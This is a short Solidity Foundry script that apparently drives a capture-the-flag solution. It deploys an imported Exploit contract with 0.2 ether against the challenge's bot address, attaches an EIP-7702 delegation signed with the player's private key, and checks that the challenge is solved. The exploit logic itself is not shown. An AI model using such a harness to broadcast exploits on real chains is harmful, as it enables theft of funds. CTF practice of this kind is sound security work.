// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {Script} from "forge-std/Script.sol";
import {Exploit} from "./Exploit.sol";
import {Setup} from "./challenge/Setup.sol";

// forge script dev/src/Exploit.s.sol --private-key $PRIVATE_KEY -vvvvv --broadcast

contract ExploitScript is Script {
    function run() public {
        address instanceAddr = vm.envAddress("INSTANCE_ADDR");
        uint256 playerPrivateKey = vm.envUint("PRIVATE_KEY");

        Setup setup = Setup(instanceAddr);

        vm.startBroadcast();
        Exploit exploit = new Exploit{value: 0.2 ether}(setup.BOT_ADDR());
        vm.signAndAttachDelegation(address(exploit), playerPrivateKey);
        exploit.exploit();
        vm.stopBroadcast();

        require(setup.isSolved(), "not solved");
    }
}
